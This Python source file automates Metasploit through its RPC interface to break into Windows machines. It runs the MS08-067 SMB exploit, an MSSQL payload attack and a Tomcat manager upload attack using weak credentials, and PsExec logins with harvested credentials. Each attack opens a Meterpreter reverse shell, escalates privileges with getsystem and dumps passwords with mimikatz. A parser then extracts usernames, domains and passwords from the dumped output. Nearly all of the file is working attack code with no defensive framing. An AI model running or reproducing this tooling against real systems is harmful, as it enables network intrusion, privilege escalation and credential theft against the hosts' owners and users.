import sys
import os
import msfrpc
import time
import netifaces
import socket

def logVal(fn,  val):
        print "{0} :: {1}".format(fn,  val)
        f = open("logs/{0}".format(fn),'a+')
        f.write(val + '\n')
        f.close()

def extractMimikatzCreds(log):
    logVal("mimi",  "entered extractMimikatzCreds()")
    logVal("mimi",  "")
    logVal("mimi",  "")
    logVal("mimi",  "")
    creds = []
    current = False
    for l in log:
        #logVal("mimi",  l)
        if l.find("Loading extension mimikatz...success.") != -1:
            current = True
        elif current:
            if l[:3] == "[*]":
                current = False

        if current:
            if l.find("There are no more files") != -1:
                res = "skipping. no creds stored in memory"
            elif l.find("LSASS en erreur") != -1:
                res = "skipping. no creds stored in memory"
            elif l[:3] != "[*]":
                try:
                    details = l.split("{")[1].split("}")[0].split(";")
                    username = details[0][1:-1]
                    domain   = details[1][1:-1]
                    password = details[2][1:-1]
                    #print "u:[{0}] d:[{1}] p:[{2}]".format(username, domain, password)
                    creds.append([username, domain, password])
                except:
                    print "error in extractMimikatzCreds :: l was [{0}]".format(l)
                    #log("mimi",  "error in extractMimikatzCreds :: l was [{0}]".format(str(l)))
    return creds

def exploitMS08067(client,  console_id,  lhost, rhost,  msfpass):
    client.call('console.write', [console_id,"use exploit/windows/smb/ms08_067_netapi\n"])
    time.sleep(1)
    client.call('console.write', [console_id, """set PAYLOAD windows/meterpreter/reverse_tcp
set RHOST """+rhost+"""
set LHOST """+lhost+"""
set LPORT """+getOpenPort()+"""
\n"""])
    time.sleep(1)
    client.call('console.write', [console_id, "exploit\n"])
    time.sleep(1)
    
    log = []
    busy = True
    sessionOpen = False
    gotSystem = False
    runMimikatz = False
    
    while busy:
        time.sleep(1)
        cl =  client.call('console.read',[console_id])
        print cl
        res = cl['data']
        
        if res != '':
            for r in res.split("\n"):
                if r != "":
                    log.append(r)
                    logVal("ms08",  r)
                    if r.find("Meterpreter session") > -1 and r.find("opened") > -1:
                    #if r.find("100.00% done") > -1:
                        sessionOpen = True
                    elif r.find('Shutting down Meterpreter') != -1:
                        busy = False
                    elif r.find('closed. Reason') != -1:
                        busy = False
                    elif r.find('Exploit failed') != -1:
                        busy = False 
                        
        if sessionOpen:
            if gotSystem == False:
                client.call('console.write', [console_id, "getsystem\n"])
                time.sleep(2)
            if runMimikatz == False:
                client.call('console.write', [console_id, "use mimikatz\n"])
                time.sleep(1)
                client.call('console.write', [console_id, "mimikatz_command -f sekurlsa::searchPasswords\n"])
                time.sleep(1)
                client.call('console.write', [console_id, "exit\n"])
                time.sleep(3)
    
#    prompt = ""
#    while prompt != "msf > ":
#        time.sleep(1)
#        cl =  client.call('console.read',[console_id])
#        print cl
#        #res = cl['data']
#        prompt = cl['prompt']

    return log

def exploitWeakMsSqlCreds(client,  console_id,  lhost, rhost,  msfpass,  sqluser,  sqlpass):
    #TODO: add a different port
    client.call('console.write', [console_id,"use exploit/windows/mssql/mssql_payload\n"])
    time.sleep(1)
    client.call('console.write', [console_id, """set PAYLOAD windows/meterpreter/reverse_tcp
set RHOST """+rhost+"""
set LHOST """+lhost+"""
set LPORT """+getOpenPort()+"""
set username """+sqluser+"""
set password """+sqlpass+"""
\n"""])
    time.sleep(1)
    client.call('console.write', [console_id, "exploit\n"])
    time.sleep(1)
    
    log = []
    busy = True
    sessionOpen = False
    gotSystem = False
    runMimikatz = False
    
    while busy:
        time.sleep(1)
        cl =  client.call('console.read',[console_id])
        print cl
        res = cl['data']
        
        if res != '':
            for r in res.split("\n"):
                if r != "":
                    log.append(r)
                    logVal("sql",  r)
                    if r.find("Meterpreter session") > -1 and r.find("opened") > -1:
                    #if r.find("100.00% done") > -1:
                        sessionOpen = True
                    elif r.find('Shutting down Meterpreter') != -1:
                        busy = False
                    elif r.find('closed. Reason') != -1:
                        busy = False
                    elif r.find('Exploit failed') != -1:
                        busy = False 
                        
        if sessionOpen:
            if gotSystem == False:
                client.call('console.write', [console_id, "getsystem\n"])
                time.sleep(3)
            if runMimikatz == False:
                client.call('console.write', [console_id, "use mimikatz\n"])
                time.sleep(1)
                client.call('console.write', [console_id, "mimikatz_command -f sekurlsa::searchPasswords\n"])
                time.sleep(1)
                client.call('console.write', [console_id, "exit\n"])
                time.sleep(3)
    return log

def exploitWeakTomcatCreds(client,  console_id,  lhost, rhost,  msfpass,  sqluser,  sqlpass):
    #TODO: pass the port as a parameter
    client.call('console.write', [console_id,"use exploit/multi/http/tomcat_mgr_upload\n"])
    time.sleep(1)
    #client.call('console.write', [console_id,"set target 1\n"])
    #time.sleep(1)
    client.call('console.write', [console_id, """set PAYLOAD windows/meterpreter/reverse_tcp
set RHOST """+rhost+"""
set RPORT """+"8080"+"""
set TARGET """+"1"+"""
set LHOST """+lhost+"""
set LPORT """+getOpenPort()+"""
set username """+sqluser+"""
set password """+sqlpass+"""
\n"""])
    time.sleep(1)
    client.call('console.write', [console_id, "exploit\n"])
    time.sleep(1)
    
    log = []
    busy = True
    sessionOpen = False
    gotSystem = False
    runMimikatz = False
    
    while busy:
        time.sleep(1)
        cl =  client.call('console.read',[console_id])
        print cl
        res = cl['data']
        
        if res != '':
            for r in res.split("\n"):
                if r != "":
                    log.append(r)
                    logVal("tomcat",  r)
                    if r.find("Meterpreter session") > -1 and r.find("opened") > -1:
                        sessionOpen = True
                    elif r.find('Shutting down Meterpreter') != -1:
                        busy = False
                    elif r.find('closed. Reason') != -1:
                        busy = False
                    elif r.find('Exploit failed') != -1:
                        busy = False 
                        
        if sessionOpen:
            if gotSystem == False:
                client.call('console.write', [console_id, "getsystem\n"])
                time.sleep(3)
            if runMimikatz == False:
                client.call('console.write', [console_id, "use mimikatz\n"])
                time.sleep(1)
                client.call('console.write', [console_id, "mimikatz_command -f sekurlsa::searchPasswords\n"])
                time.sleep(1)
                client.call('console.write', [console_id, "exit\n"])
                time.sleep(3)
    return log

def getOpenPort():
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.bind(('localhost', 0))
  addr, port = s.getsockname()
  s.close()
  return str(port)

def loginWithPsExec(client,  console_id,  lhost, rhost,  msfpass,  domain,  user,  password):
    
    client.call('console.write', [console_id,"use exploit/windows/smb/psexec\n"])
    time.sleep(1)
    client.call('console.write', [console_id, """set PAYLOAD windows/meterpreter/reverse_tcp
set RHOST """+rhost+"""
set LHOST """+lhost+"""
set LPORT """+getOpenPort()+"""
set smbdomain """+domain+"""
set smbuser """+user+"""
set smbpass """+password+"""
\n"""])
    time.sleep(1)
    client.call('console.write', [console_id, "exploit\n"])
    time.sleep(1)
    
    log = []
    busy = True
    sessionOpen = False
    gotSystem = False
    runMimikatz = False
    
    while busy:
        time.sleep(1)
        cl =  client.call('console.read',[console_id])
        print cl
        res = cl['data']
        
        if res != '':
            for r in res.split("\n"):
                if r != "":
                    log.append(r)
                    logVal("cred",  r)
                    if r.find("Meterpreter session") > -1 and r.find("opened") > -1:
                    #if r.find("100.00% done") > -1:
                        sessionOpen = True
                    elif r.find('Shutting down Meterpreter') != -1:
                        busy = False
                    elif r.find('closed. Reason') != -1:
                        busy = False
                    elif r.find('Exploit failed') != -1:
                        busy = False 
                        
        if sessionOpen:
            if gotSystem == False:
                client.call('console.write', [console_id, "getsystem\n"])
                time.sleep(3)
            if runMimikatz == False:
                client.call('console.write', [console_id, "use mimikatz\n"])
                time.sleep(1)
                client.call('console.write', [console_id, "mimikatz_command -f sekurlsa::searchPasswords\n"])
                time.sleep(5)
                client.call('console.write', [console_id, "exit\n"])
                time.sleep(3)
    return log
